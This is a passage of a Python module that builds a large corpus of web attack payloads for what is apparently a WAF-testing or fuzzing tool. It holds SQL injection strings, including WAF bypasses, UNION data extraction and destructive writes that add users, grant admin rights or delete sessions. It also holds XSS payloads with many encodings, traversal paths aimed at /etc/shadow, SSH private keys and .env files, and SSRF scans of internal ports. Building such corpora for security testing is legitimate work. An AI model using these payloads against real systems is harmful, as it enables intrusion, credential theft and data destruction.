        "' UNION SELECT (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables),NULL--",
    ]
    out.extend(subs)
    # Bit operations
    bits = [
        "' OR 1&1--", "' OR 1|1--", "' OR 1^0--",
        "' OR ~0--", "' OR 1<<1--", "' OR 4>>1--",
    ]
    out.extend(bits)
    # Like variations
    likes = [
        "' OR username LIKE 'admin%'--",
        "' OR username LIKE '%admin%'--",
        "' OR email LIKE '%@%.%'--",
        "' OR password LIKE '%'--",
        "' OR 1 LIKE 1--",
    ]
    out.extend(likes)
    # Insert/update with subquery
    writes = [
        "'; INSERT INTO users(username,password) VALUES('pwned','pwned')--",
        "'; UPDATE users SET role='admin' WHERE username='attacker'--",
        "'; DELETE FROM sessions--",
        "'; ALTER TABLE users ADD COLUMN backdoor TEXT--",
    ]
    out.extend(writes)
    return out


# Apply expansions
CORPUS["SQL Injection"] = CORPUS["SQL Injection"] + _expand_sqli() + _expand_sqli_extra()
CORPUS["XSS Injection"] = CORPUS["XSS Injection"] + _expand_xss() + _expand_xss_extra()
CORPUS["Directory Traversal"] = CORPUS["Directory Traversal"] + _expand_traversal()
CORPUS["SSRF"] = CORPUS["SSRF"] + _expand_ssrf()
CORPUS["Command Injection"] = CORPUS["Command Injection"] + _expand_cmdi()
CORPUS["SSTI"] = CORPUS["SSTI"] + _expand_ssti()
CORPUS["XXE Injection"] = CORPUS["XXE Injection"] + _expand_xxe()
CORPUS["CRLF Injection"] = CORPUS["CRLF Injection"] + _expand_crlf()
CORPUS["Open Redirect"] = CORPUS["Open Redirect"] + _expand_redirect()


def _expand_xss_encoding_combos():
    """XSS with systematic encoding variations — each tests a different WAF decode path."""
    base_payloads = [
        ("alert(1)", "alert"),
        ("alert(document.cookie)", "cookie"),
        ("alert(document.domain)", "domain"),
        ("confirm(1)", "confirm"),
        ("prompt(1)", "prompt"),
    ]
    out = []
    for pay, _tag in base_payloads:
        # HTML entity variations
        out.append(f'<img src=x onerror="{pay}">')
        out.append(f'<img src=x onerror=&#x61;lert(1)>')
        # Double encoding
        out.append(f'%253Cscript%253E{pay}%253C/script%253E')
        out.append(f'%3Cscript%3E{pay}%3C/script%3E')
        # Unicode escapes
        out.append(f'<img src=x onerror="\\u0061lert(1)">')
        out.append(f'<svg onload="\\u0061lert(1)">')
        # Mixed encoding
        out.append(f'<img src=x onerror=&#97;l&#101;rt(1)>')
        out.append(f'<svg onload=&#97;l&#101;rt(1)>')
        # Parenthesis alternatives
        out.append(f'<img src=x onerror=alert`1`>')
        out.append(f'<img src=x onerror=alert&lpar;1&rpar;>')
        # Template literal
        out.append(f'<img src=x onerror=alert`${{document.domain}}`>')
    # Context-specific: in attribute, in JS string, in HTML comment
    contexts = [
        '"><img src=x onerror=alert(1)>',
        "'><img src=x onerror=alert(1)>",
        '"><svg/onload=alert(1)>',
        "';alert(1);//",
        '";alert(1);//',
        "'-alert(1)-'",
        '"-alert(1)-"',
        '</script><script>alert(1)</script>',
        '</style><script>alert(1)</script>',
        '</textarea><script>alert(1)</script>',
        '</title><script>alert(1)</script>',
        '--><script>alert(1)</script><!--',
        '*/alert(1)/*',
        '\\";alert(1);//',
        "\\';alert(1);//",
        # Attribute breakout
        '" onmouseover="alert(1)" x="',
        "' onmouseover='alert(1)' x='",
        '" onfocus="alert(1)" autofocus x="',
        "' onfocus='alert(1)' autofocus x='",
        # src/href injection
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    ]
    out.extend(contexts)
    # Tag + attribute breakout combos
    break_tags = ["script", "style", "textarea", "title", "noscript",
                  "template", "xmp", "iframe", "noembed", "noframes"]
    for tag in break_tags:
        out.append(f'</{tag}><script>alert(1)</script>')
        out.append(f'</{tag}><img src=x onerror=alert(1)>')
        out.append(f'</{tag}><svg onload=alert(1)>')
    # onX event handler matrix (tags × events)
    tags2 = ["div", "span", "p", "h1", "li", "td", "section", "article",
             "nav", "header", "footer", "main", "aside"]
    events2 = ["onmouseover", "onmouseenter", "onfocus", "onclick",
               "ondblclick", "onkeydown", "onkeyup", "onkeypress"]
    for t in tags2:
        for e in events2[:3]:
            out.append(f'<{t} {e}=alert(1) tabindex=0>{t}</{t}>')
    return out


def _expand_sqli_waf_advanced():
    """Advanced SQLi WAF bypass — deeper encoding and technique combinations."""
    out = []
    # MySQL version comment bypass
    versions = ["50000", "50001", "40100", "40000", "50708"]
    kws = ["OR", "AND", "UNION", "SELECT", "FROM", "WHERE"]
    for ver in versions:
        for kw in kws:
            out.append(f"' /*!{ver}{kw}*/ 1=1--")
    # Case + comment combos
    for kw in ["UNION SELECT", "OR 1=1", "AND 1=1"]:
        words = kw.split()
        mixed = " ".join(
            w[0].lower() + w[1:].upper() if len(w) > 1 else w.lower()
            for w in words
        )
        out.append(f"' {mixed}--")
        out.append(f"'/**/{mixed.replace(' ','/**/')}--")
        out.append(f"'%09{mixed.replace(' ','%09')}--")
        out.append(f"'%0a{mixed.replace(' ','%0a')}--")
    # HTTP parameter pollution (the payload IS the parameter value)
    for base in ["' OR 1=1--", "' UNION SELECT 1,2,3--"]:
        out.append(f"{base}&q=safe")
        out.append(f"safe&q={base}")
    # Specific WAF bypass patterns from real-world research
    real_world = [
        "' OR 1=1-- --%0a",
        "' UNION%23foo%0aSELECT 1,2,3--",
        "' UNION%23foo*%2f*bar%0aSELECT%23foo%0a1,2,3--",
        "'||(SELECT ''||version())||'",
        "' AND GTID_SUBSET(CONCAT(0x7e,version()),1)-- -",
        "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))-- -",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
        "' AND POLYGON((SELECT * FROM(SELECT * FROM(SELECT version())a)b))-- -",
        "' AND LINESTRING((SELECT * FROM(SELECT version())a))-- -",
        "' AND MULTIPOINT((SELECT * FROM(SELECT version())a))-- -",
        "0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z",
        "if(now()=sysdate(),sleep(5),0)",
        "' AND MAKE_SET(1=1,1)-- -",
        "' AND ELT(1=1,1)-- -",
        "' AND FIELD(1,1)=1-- -",
        # JSON-based for NoSQL/Sequelize
        '{"email":{"$like":"%admin%"}}',
        '{"email":{"$notLike":"impossible"}}',
        '{"email":{"$between":["a","z"]}}',
        '{"email":{"$notIn":["nobody"]}}',
        '{"email":{"$iLike":"%admin%"}}',
        '{"email":{"$col":"email"}}',
    ]
    out.extend(real_world)
    return out


def _expand_sqli_column_enum():
    """SQLi column enumeration + data extraction payloads for 1-10 columns."""
    out = []
    for n in range(1, 11):
        cols = ",".join(["NULL"] * n)
        out.append(f"' UNION SELECT {cols}--")
        out.append(f"' UNION ALL SELECT {cols}--")
        out.append(f"' UNION SELECT {cols}#")
        out.append(f"' UNION SELECT {cols}-- -")
        # With version() in first column
        cols_ver = "version()," + ",".join(["NULL"] * (n - 1)) if n > 1 else "version()"
        out.append(f"' UNION SELECT {cols_ver}--")
    # Different databases version extraction
    db_funcs = [
        ("@@version", "MSSQL/MySQL"), ("version()", "PostgreSQL/MySQL"),
        ("sqlite_version()", "SQLite"), ("banner FROM v$version", "Oracle"),
    ]
    for func, _db in db_funcs:
        for n in [1, 2, 3, 5]:
            rest = ",".join(["NULL"] * (n - 1)) if n > 1 else ""
            sep = "," if rest else ""
            out.append(f"' UNION SELECT {func}{sep}{rest}--")
    return out


def _expand_traversal_deep():
    """Deeper traversal with more targets and exotic encodings."""
    files_unix = [
        "etc/passwd", "etc/shadow", "etc/hostname", "etc/hosts",
        "etc/apache2/apache2.conf", "etc/nginx/nginx.conf",
        "etc/mysql/my.cnf", "var/log/auth.log", "var/log/syslog",
        "proc/self/environ", "proc/self/cmdline", "proc/self/fd/0",
        "proc/self/maps", "proc/self/status", "proc/version",
        "root/.bash_history", "root/.ssh/id_rsa", "root/.ssh/authorized_keys",
        "home/user/.bash_history", "var/www/html/index.php",
        "var/www/html/wp-config.php", "var/www/html/.env",
    ]
    out = []
    for f in files_unix:
        for depth in [4, 6, 8]:
            out.append("../" * depth + f)
            out.append("..%2f" * depth + f.replace("/", "%2f"))
            out.append("..%252f" * depth + f.replace("/", "%252f"))
    # Null byte variations
    for f in files_unix[:5]:
        out.append("../../../../" + f + "%00")
        out.append("../../../../" + f + "%00.jpg")
        out.append("../../../../" + f + "%00.html")
        out.append("../../../../" + f + "%00.pdf")
    return out


def _expand_ssrf_ports():
    """SSRF with common internal service ports."""
    ports = [80, 443, 8080, 8443, 3000, 3306, 5432, 6379, 27017,
             9200, 8888, 9090, 5000, 4444, 8000, 8081, 11211, 2379]
    targets = ["127.0.0.1", "localhost", "0.0.0.0"]
    out = []
    for t in targets:
        for p in ports:
            out.append(f"http://{t}:{p}/")
    # Internal network scanning
    for octet in range(1, 20):
        out.append(f"http://10.0.0.{octet}/")
        out.append(f"http://172.16.0.{octet}/")
        out.append(f"http://192.168.1.{octet}/")
    return out


CORPUS["XSS Injection"] = CORPUS["XSS Injection"] + _expand_xss_encoding_combos()
CORPUS["SQL Injection"] = CORPUS["SQL Injection"] + _expand_sqli_waf_advanced() + _expand_sqli_column_enum()
CORPUS["Directory Traversal"] = CORPUS["Directory Traversal"] + _expand_traversal_deep()
CORPUS["SSRF"] = CORPUS["SSRF"] + _expand_ssrf_ports()


# Deduplicate within each class
for _cls in CORPUS:
    CORPUS[_cls] = list(dict.fromkeys(CORPUS[_cls]))


def corpus_for(attack_class: str) -> list[str]:
    from .seeds import resolve_class
    return list(CORPUS.get(resolve_class(attack_class), []))


def corpus_all() -> dict[str, list[str]]:
    return {k: list(v) for k, v in CORPUS.items()}


def corpus_stats() -> dict[str, int]:
    return {k: len(v) for k, v in CORPUS.items()}


def corpus_total() -> int:
    return sum(len(v) for v in CORPUS.values())
